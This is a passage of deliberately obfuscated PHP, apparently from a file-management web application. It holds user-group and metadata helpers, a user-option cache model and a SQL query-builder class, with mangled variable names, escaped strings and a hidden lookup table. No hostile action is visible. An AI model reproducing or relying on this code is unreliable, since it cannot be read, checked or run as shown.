$Çø¹Œ); } private function _listAppendSourceRoot(&$Ì™¢İ—, $„ÚÑÍîÒ) { $ÌŞÊ¼ı =& $_SERVER[¤·²È‰º]; $ŞÛËÅ¯¨ = Model($ÌŞÊ¼ı[826])->listSourceRoot(SourceModel::TYPE_USER, $„ÚÑÍîÒ); $ŞÛËÅ¯¨ = array_to_keyvalue($ŞÛËÅ¯¨, $ÌŞÊ¼ı[513]); $ŞÛËÅ¯¨ = array_remove_key($ŞÛËÅ¯¨, $ÌŞÊ¼ı[513]); foreach ($Ì™¢İ— as &$´ííßÌ) { $´ííßÌ[$ÌŞÊ¼ı[96]] = $ŞÛËÅ¯¨[$´ííßÌ[$ÌŞÊ¼ı[1651]]] ? $ŞÛËÅ¯¨[$´ííßÌ[$ÌŞÊ¼ı[1651]]] : array(); } unset($´ííßÌ); } private function _listAppendGroup(&$÷ ’¹Èã, $ì©‡«ÌŞ) { $’–åÑ¦¦ =& $_SERVER[¤·²È‰º]; $‚…î¿Şå = array($’–åÑ¦¦[1651] => array($’–åÑ¦¦[7], $ì©‡«ÌŞ)); $‹†Ë½ÀÍ = Model($’–åÑ¦¦[1913])->where($‚…î¿Şå)->select(); $‰…“ˆÖ¸ = array_to_keyvalue($‹†Ë½ÀÍ, $’–åÑ¦¦[12], $’–åÑ¦¦[1823]); $‰…“ˆÖ¸ = array_remove_value(array_unique($‰…“ˆÖ¸), $’–åÑ¦¦[207]); if (!$‰…“ˆÖ¸ || !$‹†Ë½ÀÍ) { return; } $‚…î¿Şå = array($’–åÑ¦¦[1823] => array($’–åÑ¦¦[7], $‰…“ˆÖ¸)); $ñø¯×Â¥ = Model($’–åÑ¦¦[2004])->field($’–åÑ¦¦[2309])->where($‚…î¿Şå)->select(); $ñø¯×Â¥ = array_to_keyvalue($ñø¯×Â¥, $’–åÑ¦¦[1823]); $‹†Ë½ÀÍ = array_to_keyvalue_group($‹†Ë½ÀÍ, $’–åÑ¦¦[1651]); foreach ($‹†Ë½ÀÍ as &$Ÿëğ²¶³) { $·®²‚÷ = array(); foreach ($Ÿëğ²¶³ as $İ„‚¢Åª) { if (!$İ„‚¢Åª[$’–åÑ¦¦[1927]]) { continue; } $ÊÈ™ˆ = Model($’–åÑ¦¦[515])->listData($İ„‚¢Åª[$’–åÑ¦¦[1927]]); $·®²‚÷[] = array($’–åÑ¦¦[1823] => $İ„‚¢Åª[$’–åÑ¦¦[1823]], $’–åÑ¦¦[2310] => $ñø¯×Â¥[$İ„‚¢Åª[$’–åÑ¦¦[1823]]][$’–åÑ¦¦[42]], $’–åÑ¦¦[529] => $ñø¯×Â¥[$İ„‚¢Åª[$’–åÑ¦¦[1823]]][$’–åÑ¦¦[529]], $’–åÑ¦¦[421] => $ÊÈ™ˆ); } $Ÿëğ²¶³ = $·®²‚÷; } unset($Ÿëğ²¶³); foreach ($÷ ’¹Èã as &$‚“è´ü¨) { $‚“è´ü¨[$’–åÑ¦¦[2006]] = array(); if (isset($‹†Ë½ÀÍ[$‚“è´ü¨[$’–åÑ¦¦[1651]]])) { $‚“è´ü¨[$’–åÑ¦¦[2006]] = $‹†Ë½ÀÍ[$‚“è´ü¨[$’–åÑ¦¦[1651]]]; } } unset($‚“è´ü¨); } public function userAppendGroup($ê½ëŞÏà) { $¶ê‚­– =& $_SERVER[¤·²È‰º]; if (!$ê½ëŞÏà) { return array(); } $this->_listAppendGroup($ê½ëŞÏà, array_to_keyvalue($ê½ëŞÏà, $¶ê‚­–[12], $¶ê‚­–[1651])); return $ê½ëŞÏà; } private function _listAppendMeta(&$‘ÒÌŠ¦±, $¼¡ôà‘) { $º™İ§Ã’ =& $_SERVER[¤·²È‰º]; $î´ôãš² = UserJobModel::JOB_KEY; $–É˜†æó = array($º™İ§Ã’[2290]); $®İ´ÌÊ = array($º™İ§Ã’[1651] => array($º™İ§Ã’[7], $¼¡ôà‘)); $®—Í¤ = Model($º™İ§Ã’[2288])->where($®İ´ÌÊ)->select(); $®—Í¤ = array_to_keyvalue_group($®—Í¤, $º™İ§Ã’[1651]); foreach ($®—Í¤ as &$òğü–ıî) { $¯Åã®Ó§ = array(); foreach ($òğü–ıî as $Éßó¶éª) { if (!in_array($Éßó¶éª[$º™İ§Ã’[104]], $–É˜†æó)) { $¯Åã®Ó§[$Éßó¶éª[$º™İ§Ã’[104]]] = $Éßó¶éª[$º™İ§Ã’[383]]; } } $òğü–ıî = $¯Åã®Ó§; } unset($òğü–ıî); $ƒ›é‰öÚ = Model($º™İ§Ã’[2311]); foreach ($‘ÒÌŠ¦± as &$¨²ñğòŒ) { $§Öí²º˜ = array(); if (isset($®—Í¤[$¨²ñğòŒ[$º™İ§Ã’[1651]]])) { $§Öí²º˜ = $®—Í¤[$¨²ñğòŒ[$º™İ§Ã’[1651]]]; } $¨²ñğòŒ[$º™İ§Ã’[2312]] = array(); if (isset($§Öí²º˜[$î´ôãš²])) { $¨²ñğòŒ[$º™İ§Ã’[2312]] = $ƒ›é‰öÚ->getUserJobInfo($§Öí²º˜[$î´ôãš²]); } } unset($¨²ñğòŒ); } protected function groupUserAll($Ïİºï™°) { $˜ñ”¸’ =& $_SERVER[¤·²È‰º]; if (!$Ïİºï™°) { return !1; } $§ÒÂ‡¯ì = Model($˜ñ”¸’[1913])->field($˜ñ”¸’[1651])->where(array($˜ñ”¸’[1823] => array($˜ñ”¸’[7], $Ïİºï™°)))->select(); $§ÒÂ‡¯ì = array_to_keyvalue($§ÒÂ‡¯ì, $˜ñ”¸’[12], $˜ñ”¸’[1651]); return array_unique($§ÒÂ‡¯ì); } public function userSearch($—ğúæİ, $×íÚê´­ = "\x2a") { return Model($_SERVER[¤·²È‰º][543])->where($—ğúæİ)->field($×íÚê´­)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\137\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¦è°¢è) { $›²è³ˆ¢ =& $_SERVER[¤·²È‰º]; if (!defined($›²è³ˆ¢[483])) { define($›²è³ˆ¢[483], 0); } return "\x55\x73\x65\162\x4f\x70\164\151\x6f\x6e\137{$¦è°¢è}\x5f" . USER_ID; } protected function filterWhere($·Ğ…ûÖ¦) { $Şøƒ˜¬Ñ =& $_SERVER[¤·²È‰º]; if (!defined($Şøƒ˜¬Ñ[483])) { define($Şøƒ˜¬Ñ[483], 0); } $·Ğ…ûÖ¦[$Şøƒ˜¬Ñ[1651]] = USER_ID; return $·Ğ…ûÖ¦; } public function cacheRemoveUser($‰›‹Û¯, $ãúÏ€¢Û) { return Cache::remove("\x55\x73\x65\162\x4f\160\x74\151\157\156\137{$‰›‹Û¯}\x5f" . $ãúÏ€¢Û); } protected function optionDefault($ëæ›‰’Æ = '') { $›æ…½€æ =& $_SERVER[¤·²È‰º]; if ($ëæ›‰’Æ == $›æ…½€æ[12]) { return $GLOBALS[$›æ…½€æ[6]][$›æ…½€æ[2313]]; } if ($ëæ›‰’Æ == $›æ…½€æ[2314]) { return $GLOBALS[$›æ…½€æ[6]][$›æ…½€æ[2315]]; } } } goto c«ÀŠÀ˜’Ã; A˜¥¬Í¡Ÿƒ: define($_SERVER[¤·²È‰º][248], 2); define($_SERVER[¤·²È‰º][249], 3); define($_SERVER[¤·²È‰º][250], 1); goto d£®Ø³µ¸î; f¼™ë¦³İø: class DbSqlite3 extends DbSqlite3Base { public function query($«ÂËÍ) { $ÑÍ…©‚ç =& $_SERVER[¤·²È‰º]; if (!CacheLock::fileLock($ÑÍ…©‚ç[23])) { return !1; } $ŞôÆèÊã = parent::query($«ÂËÍ); CacheLock::fileUnLock($ÑÍ…©‚ç[23]); return $ŞôÆèÊã; } public function execute($±õ–¬öá) { $İïÎ¡ş =& $_SERVER[¤·²È‰º]; if (!CacheLock::fileLock($İïÎ¡ş[23])) { return !1; } $ø‚á½‘„ = parent::execute($±õ–¬öá); CacheLock::fileUnLock($İïÎ¡ş[23]); return $ø‚á½‘„; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\x65\161" => "\74\x3e", "\x67\164" => "\76", "\x65\x67\164" => "\76\x3d", "\154\x74" => "\x3c", "\145\154\164" => "\x3c\x3d", "\x6e\x6f\164\x6c\x69\153\145" => "\116\117\124\x20\x4c\x49\113\105", "\x6c\151\153\x65" => "\x4c\x49\113\105", "\x69\156" => "\111\x4e", "\x6e\157\164\151\x6e" => "\116\x4f\124\x20\111\x4e", "\156\x6f\164\40\x69\156" => "\116\x4f\124\40\111\x4e", "\142\x65\x74\x77\x65\x65\156" => "\102\105\x54\x57\x45\x45\116", "\156\x6f\x74\x62\x65\164\167\x65\x65\156" => "\x4e\117\x54\40\102\x45\124\127\105\105\116", "\x6e\157\164\x20\x62\x65\164\167\145\145\156" => "\x4e\x4f\124\40\102\105\124\x57\x45\x45\x4e"); protected $selectSql = "\x53\x45\114\x45\x43\124\45\x44\x49\x53\x54\x49\x4e\103\x54\45\40\x25\106\111\x45\114\104\45\x20\106\122\x4f\115\40\45\x54\101\x42\x4c\105\45\45\x4a\x4f\111\x4e\45\x25\x57\110\x45\122\105\x25\x25\107\x52\x4f\125\x50\x25\x25\110\101\x56\111\116\x47\45\45\x4f\x52\104\x45\122\x25\45\x4c\111\x4d\x49\124\45\x20\45\125\x4e\111\117\116\45\45\x43\117\x4d\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $‹Êçú­ü = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¤·²È‰º][954], $‹Êçú­ü); } public function factory($¼¼ğş»„ = '') { $²èª¶‹Ô =& $_SERVER[¤·²È‰º]; $¼¼ğş»„ = $this->parseConfig($¼¼ğş»„); if (empty($¼¼ğş»„[$²èª¶‹Ô[955]])) { think_exception(think_lang($²èª¶‹Ô[956])); } $this->dbType = ucwords(strtolower($¼¼ğş»„[$²èª¶‹Ô[955]])); $½Ô¯¤¾´ = $²èª¶‹Ô[957] . $this->dbType; if (class_exists($½Ô¯¤¾´)) { $İŠ™Áä£ = new $½Ô¯¤¾´($¼¼ğş»„); if ($²èª¶‹Ô[958] != strtolower($¼¼ğş»„[$²èª¶‹Ô[955]])) { $İŠ™Áä£->dbType = strtoupper($this->dbType); } else { $İŠ™Áä£->dbType = $this->_getDsnType($¼¼ğş»„[$²èª¶‹Ô[910]]); } } else { think_exception(think_lang($²èª¶‹Ô[959]) . $²èª¶‹Ô[960] . $½Ô¯¤¾´); } return $İŠ™Áä£; } public function __call($ˆÍÁ™², $šºˆûª) { if (method_exists($this, $ˆÍÁ™²)) { return call_user_func_array(array($this, $ˆÍÁ™²), $šºˆûª); } } protected function _getDsnType($Ş‡Ú‘±–) { $›ºÈû™¬ = explode($_SERVER[¤·²È‰º][4], $Ş‡Ú‘±–); $ûÅå¥Ïô = strtoupper(trim($›ºÈû™¬[0])); return $ûÅå¥Ïô; } private function parseConfig($¹‹ƒ¡Øô = '') { $˜ë¼ÆºÂ =& $_SERVER[¤·²È‰º]; if (!empty($¹‹ƒ¡Øô) && is_string($¹‹ƒ¡Øô)) { $¹‹ƒ¡Øô = $this->parseDSN($¹‹ƒ¡Øô); } elseif (is_array($¹‹ƒ¡Øô)) { $¹‹ƒ¡Øô = array_change_key_case($¹‹ƒ¡Øô); $¹‹ƒ¡Øô = array($˜ë¼ÆºÂ[955] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[961]], $˜ë¼ÆºÂ[882] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[962]], $˜ë¼ÆºÂ[883] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[963]], $˜ë¼ÆºÂ[880] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[964]], $˜ë¼ÆºÂ[881] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[965]], $˜ë¼ÆºÂ[31] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[966]], $˜ë¼ÆºÂ[910] => $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[967]], $˜ë¼ÆºÂ[27] => isset($¹‹ƒ¡Øô[$˜ë¼ÆºÂ[968]]) ? $¹‹ƒ¡Øô[$˜ë¼ÆºÂ[968]] : array()); } elseif (empty($¹‹ƒ¡Øô)) { if (think_config($˜ë¼ÆºÂ[969]) && $˜ë¼ÆºÂ[958] != strtolower(think_config($˜ë¼ÆºÂ[970]))) { $¹‹ƒ¡Øô = $this->parseDSN(think_config($˜ë¼ÆºÂ[969])); } else { $¹‹ƒ¡Øô = array($˜ë¼ÆºÂ[955] => think_config($˜ë¼ÆºÂ[970]), $˜ë¼ÆºÂ[882] => think_config($˜ë¼ÆºÂ[971]), $˜ë¼ÆºÂ[883] => think_config($˜ë¼ÆºÂ[972]), $˜ë¼ÆºÂ[880] => think_config($˜ë¼ÆºÂ[973]), $˜ë¼ÆºÂ[881] => think_config($˜ë¼ÆºÂ[974]), $˜ë¼ÆºÂ[31] => think_config($˜ë¼ÆºÂ[255]), $˜ë¼ÆºÂ[910] => think_config($˜ë¼ÆºÂ[969]), $˜ë¼ÆºÂ[27] => think_config($˜ë¼ÆºÂ[975])); } } return $¹‹ƒ¡Øô; } protected function initConnect($ªí¹¾Ë™ = true) { if (1 == think_config($_SERVER[¤·²È‰º][32])) { $this->_linkID = $this->multiConnect($ªí¹¾Ë™); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¹£ï£èé => $˜Œ¾£¡) { $this->_linkID = $˜Œ¾£¡; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¸€ø‰ƒ¶ = false) { $ğÙ­±Ó› =& $_SERVER[¤·²È‰º]; static $ñí¤Ë¢Ñ = array(); static $Û¹àûğ¡ = -1; if (empty($ñí¤Ë¢Ñ)) { foreach ($this->config as $¸£ÓŸê® => $Ó½‰û) { $ñí¤Ë¢Ñ[$¸£ÓŸê®] = explode($ğÙ­±Ó›[60], $Ó½‰û); } } if (think_config($ğÙ­±Ó›[976])) { if ($¸€ø‰ƒ¶ || think_config($ğÙ­±Ó›[403]) === !0) { $ôéÚ­êĞ = floor(mt_rand(0, think_config($ğÙ­±Ó›[977]) - 1)); $Û¹àûğ¡ = $ôéÚ­êĞ; } else { if (is_numeric(think_config($ğÙ­±Ó›[978]))) { $ôéÚ­êĞ = think_config($ğÙ­±Ó›[978]); } else { $ôéÚ­êĞ = floor(mt_rand(think_config($ğÙ­±Ó›[977]), count($ñí¤Ë¢Ñ[$ğÙ­±Ó›[880]]) - 1)); } } } else { $ôéÚ­êĞ = floor(mt_rand(0, count($ñí¤Ë¢Ñ[$ğÙ­±Ó›[880]]) - 1)); $Û¹àûğ¡ = $ôéÚ­êĞ; } $ôéÚ­êĞ = $Û¹àûğ¡ !== -1 ? $Û¹àûğ¡ : $ôéÚ­êĞ; $æ×È´¡æ = array($ğÙ­±Ó›[882] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[882]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[882]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[882]][0], $ğÙ­±Ó›[883] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[883]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[883]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[883]][0], $ğÙ­±Ó›[880] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[880]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[880]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[880]][0], $ğÙ­±Ó›[881] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[881]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[881]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[881]][0], $ğÙ­±Ó›[31] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[31]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[31]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[31]][0], $ğÙ­±Ó›[910] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[910]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[910]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[910]][0], $ğÙ­±Ó›[27] => isset($ñí¤Ë¢Ñ[$ğÙ­±Ó›[27]][$ôéÚ­êĞ]) ? $ñí¤Ë¢Ñ[$ğÙ­±Ó›[27]][$ôéÚ­êĞ] : $ñí¤Ë¢Ñ[$ğÙ­±Ó›[27]][0]); return $this->connect($æ×È´¡æ, $ôéÚ­êĞ); } public function parseDSN($íĞÜ–Ï®) { $İÉ¬”  =& $_SERVER[¤·²È‰º]; if (empty($íĞÜ–Ï®)) { return !1; } $İïÃŞ‘® = parse_url($íĞÜ–Ï®); if ($İïÃŞ‘®[$İÉ¬” [190]]) { $ô«–·Ìğ = array($İÉ¬” [955] => $İïÃŞ‘®[$İÉ¬” [190]], $İÉ¬” [882] => isset($İïÃŞ‘®[$İÉ¬” [608]]) ? $İïÃŞ‘®[$İÉ¬” [608]] : $İÉ¬” [12], $İÉ¬” [883] => isset($İïÃŞ‘®[$İÉ¬” [979]]) ? $İïÃŞ‘®[$İÉ¬” [979]] : $İÉ¬” [12], $İÉ¬” [880] => isset($İïÃŞ‘®[$İÉ¬” [191]]) ? $İïÃŞ‘®[$İÉ¬” [191]] : $İÉ¬” [12], $İÉ¬” [881] => isset($İïÃŞ‘®[$İÉ¬” [192]]) ? $İïÃŞ‘®[$İÉ¬” [192]] : $İÉ¬” [12], $İÉ¬” [31] => isset($İïÃŞ‘®[$İÉ¬” [94]]) ? substr($İïÃŞ‘®[$İÉ¬” [94]], 1) : $İÉ¬” [12]); } else { preg_match($İÉ¬” [980], trim($íĞÜ–Ï®), $–Ç‚¸æ°); $ô«–·Ìğ = array($İÉ¬” [955] => $–Ç‚¸æ°[1], $İÉ¬” [882] => $–Ç‚¸æ°[2], $İÉ¬” [883] => $–Ç‚¸æ°[3], $İÉ¬” [880] => $–Ç‚¸æ°[4], $İÉ¬” [881] => $–Ç‚¸æ°[5], $İÉ¬” [31] => $–Ç‚¸æ°[6]); } $ô«–·Ìğ[$İÉ¬” [910]] = $İÉ¬” [12]; return $ô«–·Ìğ; } protected function debug() { $ŠëÀûÏÀ =& $_SERVER[¤·²È‰º]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ŠëÀûÏÀ[981]; if (think_config($ŠëÀûÏÀ[982])) { think_status($ŠëÀûÏÀ[983]); think_trace($this->queryStr . $ŠëÀûÏÀ[984] . think_status($ŠëÀûÏÀ[34], $ŠëÀûÏÀ[983], 6) . $ŠëÀûÏÀ[985], $ŠëÀûÏÀ[12], $ŠëÀûÏÀ[986]); } } protected function parseLock($à¸‰¸© = false) { $™ëŠœ­ì =& $_SERVER[¤·²È‰º]; if (!$à¸‰¸©) { return $™ëŠœ­ì[12]; } if ($™ëŠœ­ì[912] == $this->dbType) { return $™ëŠœ­ì[987]; } return $™ëŠœ­ì[988]; } protected function parseSet($í—›ËÛµ) { $ÜõÖŠÀ =& $_SERVER[¤·²È‰º]; foreach ($í—›ËÛµ as $æ‰ß»›Ú => $¸©ŞØ°) { if (is_array($¸©ŞØ°) && $ÜõÖŠÀ[306] == $¸©ŞØ°[0]) { $‹âòÙ¯[] = $this->parseKey($æ‰ß»›Ú) . $ÜõÖŠÀ[878] . $¸©ŞØ°[1]; } elseif (is_scalar($¸©ŞØ°) || is_null($¸©ŞØ°)) { $‹âòÙ¯[] = $this->parseKey($æ‰ß»›Ú) . $ÜõÖŠÀ[878] . $this->parseValue($¸©ŞØ°); } } return $ÜõÖŠÀ[989] . implode($ÜõÖŠÀ[60], $‹âòÙ¯); } protected function bindParam($•ğß«À, $ò²ÌõÁŠ) { $this->bind[$_SERVER[¤·²È‰º][4] . $•ğß«À] = $ò²ÌõÁŠ; } protected function parseBind($â‡Äéü) { $â‡Äéü = array_merge($this->bind, $â‡Äéü); $this->bind = array(); return $â‡Äéü; } function parseKey(&$Ü™æ®Â¥, $Šô±à³Ó = true) { if ($Šô±à³Ó) { $Ü™æ®Â¥ = $this->parseKeyCheck($Ü™æ®Â¥); } return $Ü™æ®Â¥; } function parseKeyCheck($ûùŸœ¨Ï) { $¥ñ¹µÊ =& $_SERVER[¤·²È‰º]; $ûùŸœ¨Ï = trim($ûùŸœ¨Ï); if (!preg_match($¥ñ¹µÊ[990], $ûùŸœ¨Ï)) { think_exception($¥ñ¹µÊ[991] . $ûùŸœ¨Ï); } return $ûùŸœ¨Ï; } protected function parseValue($·èÔ˜”Á) { $›¡Òé§ =& $_SERVER[¤·²È‰º]; if (is_string($·èÔ˜”Á)) { $·èÔ˜”Á = $›¡Òé§[951] . $this->escapeString($·èÔ˜”Á) . $›¡Òé§[951]; } elseif (isset($·èÔ˜”Á[0]) && is_string($·èÔ˜”Á[0]) && strtolower($·èÔ˜”Á[0]) == $›¡Òé§[306]) { $·èÔ˜”Á = $this->escapeString($·èÔ˜”Á[1]); } elseif (is_array($·èÔ˜”Á)) { $·èÔ˜”Á = array_map(array($this, $›¡Òé§[952]), $·èÔ˜”Á); } elseif (is_bool($·èÔ˜”Á)) { $·èÔ˜”Á = $·èÔ˜”Á ? $›¡Òé§[98] : $›¡Òé§[207]; } elseif (is_null($·èÔ˜”Á)) { $·èÔ˜”Á = $›¡Òé§[113]; } return $·èÔ˜”Á; } protected function parseField($¥Èˆé¹ş) { $ù´å¿‹À =& $_SERVER[¤·²È‰º]; if (is_string($¥Èˆé¹ş) && strpos($¥Èˆé¹ş, $ù´å¿‹À[60])) { $¥Èˆé¹ş = explode($ù´å¿‹À[60], $¥Èˆé¹ş); } if (is_array($¥Èˆé¹ş)) { $ÃûóÜàâ = array(); foreach ($¥Èˆé¹ş as $²Ò¶ãÛ => $šÔ°½’¢) { if (!is_numeric($²Ò¶ãÛ)) { $ÃûóÜàâ[] = $this->parseKey($²Ò¶ãÛ, !1) . $ù´å¿‹À[992] . $this->parseKey($šÔ°½’¢); } else { $ÃûóÜàâ[] = $this->parseKey($šÔ°½’¢); } } $¡İµÖŠ¸ = implode($ù´å¿‹À[60], $ÃûóÜàâ); } elseif (is_string($¥Èˆé¹ş) && !empty($¥Èˆé¹ş)) { $¡İµÖŠ¸ = $¥Èˆé¹ş; } else { $¡İµÖŠ¸ = $ù´å¿‹À[198]; } return $¡İµÖŠ¸; } protected function parseTable($ÏÙ†ÖÀÛ) { $°¨ü¢ß =& $_SERVER[¤·²È‰º]; if (is_array($ÏÙ†ÖÀÛ)) { $öî²ÚüŒ = array(); foreach ($ÏÙ†ÖÀÛ as $è³‰åçí => $¬†Š³ß) { if (!is_numeric($è³‰åçí)) { $öî²ÚüŒ[] = $this->parseKey($è³‰åçí) . $°¨ü¢ß[63] . $this->parseKey($¬†Š³ß); } else { $öî²ÚüŒ[] = $this->parseKey($è³‰åçí); } } $ÏÙ†ÖÀÛ = $öî²ÚüŒ; } elseif (is_string($ÏÙ†ÖÀÛ)) { if (strstr($ÏÙ†ÖÀÛ, $°¨ü¢ß[63])) { return $ÏÙ†ÖÀÛ; } $ÏÙ†ÖÀÛ = explode($°¨ü¢ß[60], $ÏÙ†ÖÀÛ); array_walk($ÏÙ†ÖÀÛ, array($this, $°¨ü¢ß[900])); } return $°¨ü¢ß[894] . trim(implode($°¨ü¢ß[993], $ÏÙ†ÖÀÛ), $°¨ü¢ß[393]) . $°¨ü¢ß[894]; } protected function parseWhere($œâæ”Ç») { $ÂÎí’ó¹ =& $_SERVER[¤·²È‰º]; $³ˆš’½Ÿ = $ÂÎí’ó¹[12]; if (is_string($œâæ”Ç»)) { $³ˆš’½Ÿ = $œâæ”Ç»; } else { $‰¨î°Èï = isset($œâæ”Ç»[$ÂÎí’ó¹[994]]) ? strtoupper($œâæ”Ç»[$ÂÎí’ó¹[994]]) : $ÂÎí’ó¹[12]; if (in_array($‰¨î°Èï, array($ÂÎí’ó¹[995], $ÂÎí’ó¹[996], $ÂÎí’ó¹[997]))) { $‰¨î°Èï = $ÂÎí’ó¹[63] . $‰¨î°Èï . $ÂÎí’ó¹[63]; unset($œâæ”Ç»[$ÂÎí’ó¹[994]]); } else { $‰¨î°Èï = $ÂÎí’ó¹[998]; } foreach ($œâæ”Ç» as $î÷°¦Õ => $—ì÷²†Ó) { $³ˆš’½Ÿ .= $ÂÎí’ó¹[286]; if (is_numeric($î÷°¦Õ)) { $î÷°¦Õ = $ÂÎí’ó¹[999]; } if (0 === strpos($î÷°¦Õ, $ÂÎí’ó¹[11])) { $³ˆš’½Ÿ .= $this->parseThinkWhere($î÷°¦Õ, $—ì÷²†Ó); } else { if (!preg_match($ÂÎí’ó¹[1000], trim($î÷°¦Õ))) { think_exception(think_lang($ÂÎí’ó¹[1001]) . $ÂÎí’ó¹[4] . $î÷°¦Õ); } $Ä”Ö¼Ô = is_array($—ì÷²†Ó) && isset($—ì÷²†Ó[$ÂÎí’ó¹[1002]]); $î÷°¦Õ = trim($î÷°¦Õ); if (strpos($î÷°¦Õ, $ÂÎí’ó¹[292])) { $—ì¼¢øÈ = explode($ÂÎí’ó¹[292], $î÷°¦Õ); $×­’“ÔÏ = array(); foreach ($—ì¼¢øÈ as $Àï°Éøª => $ßã®Ìàä) { $ÓŸ÷ÉŠÓ = $Ä”Ö¼Ô ? $—ì÷²†Ó[$Àï°Éøª] : $—ì÷²†Ó; $×­’“ÔÏ[] = $ÂÎí’ó¹[269] . $this->parseWhereItem($this->parseKey($ßã®Ìàä), $ÓŸ÷ÉŠÓ) . $ÂÎí’ó¹[899]; } $³ˆš’½Ÿ .= implode($ÂÎí’ó¹[1003], $×­’“ÔÏ); } elseif (strpos($î÷°¦Õ, $ÂÎí’ó¹[293])) { $—ì¼¢øÈ = explode($ÂÎí’ó¹[293], $î÷°¦Õ); $×­’“ÔÏ = array(); foreach ($—ì¼¢øÈ as $Àï°Éøª => $ßã®Ìàä) { $ÓŸ÷ÉŠÓ = $Ä”Ö¼Ô ? $—ì÷²†Ó[$Àï°Éøª] : $—ì÷²†Ó; $×­’“ÔÏ[] = $ÂÎí’ó¹[269] . $this->parseWhereItem($this->parseKey($ßã®Ìàä), $ÓŸ÷ÉŠÓ) . $ÂÎí’ó¹[899]; } $³ˆš’½Ÿ .= implode($ÂÎí’ó¹[998], $×­’“ÔÏ); } else { $³ˆš’½Ÿ .= $this->parseWhereItem($this->parseKey($î÷°¦Õ), $—ì÷²†Ó); } } $³ˆš’½Ÿ .= $ÂÎí’ó¹[287] . $‰¨î°Èï; } $³ˆš’½Ÿ = substr($³ˆš’½Ÿ, 0, -strlen($‰¨î°Èï)); } return empty($³ˆš’½Ÿ) ? $ÂÎí’ó¹[12] : $ÂÎí’ó¹[1004] . $³ˆš’½Ÿ; } protected function parseWhereItem($‹€ªµ°, $ŞôÀÉ£) { $³‚ÌŞ«‰ =& $_SERVER[¤·²È‰º]; $†¥ú»‹· = $³‚ÌŞ«‰[12]; if (is_array($ŞôÀÉ£)) { if (is_string($ŞôÀÉ£[0])) { $¡ÑøÌ’è = strtolower($ŞôÀÉ£[0]); if (in_array($ŞôÀÉ£[0], array($³‚ÌŞ«‰[878], $³‚ÌŞ«‰[1005], $³‚ÌŞ«‰[1006], $³‚ÌŞ«‰[1007], $³‚ÌŞ«‰[1008], $³‚ÌŞ«‰[1009]))) { $†¥ú»‹· .= $‹€ªµ° . $³‚ÌŞ«‰[63] . $ŞôÀÉ£[0] . $³‚ÌŞ«‰[63] . $this->parseValue($ŞôÀÉ£[1]); } elseif (preg_match($³‚ÌŞ«‰[1010], $ŞôÀÉ£[0])) { $†¥ú»‹· .= $‹€ªµ° . $³‚ÌŞ«‰[63] . $this->exp[$¡ÑøÌ’è] . $³‚ÌŞ«‰[63] . $this->parseValue($ŞôÀÉ£[1]); } elseif (preg_match($³‚ÌŞ«‰[1011], $ŞôÀÉ£[0])) { if (is_array($ŞôÀÉ£[1])) { $¡×¬àø“ = isset($ŞôÀÉ£[2]) ? strtoupper($ŞôÀÉ£[2]) : $³‚ÌŞ«‰[996]; if (in_array($¡×¬àø“, array($³‚ÌŞ«‰[995], $³‚ÌŞ«‰[996], $³‚ÌŞ«‰[997]))) { $š›‘¿êÅ = array(); foreach ($ŞôÀÉ£[1] as $¼ôíŠÃ‹) { $š›‘¿êÅ[] = $‹€ªµ° . $³‚ÌŞ«‰[63] . $this->exp[$¡ÑøÌ’è] . $³‚ÌŞ«‰[63] . $this->parseValue($¼ôíŠÃ‹); } $†¥ú»‹· .= $³‚ÌŞ«‰[269] . implode($³‚ÌŞ«‰[63] . $¡×¬àø“ . $³‚ÌŞ«‰[63], $š›‘¿êÅ) . $³‚ÌŞ«‰[899]; } } else { $†¥ú»‹· .= $‹€ªµ° . $³‚ÌŞ«‰[63] . $this->exp[$¡ÑøÌ’è] . 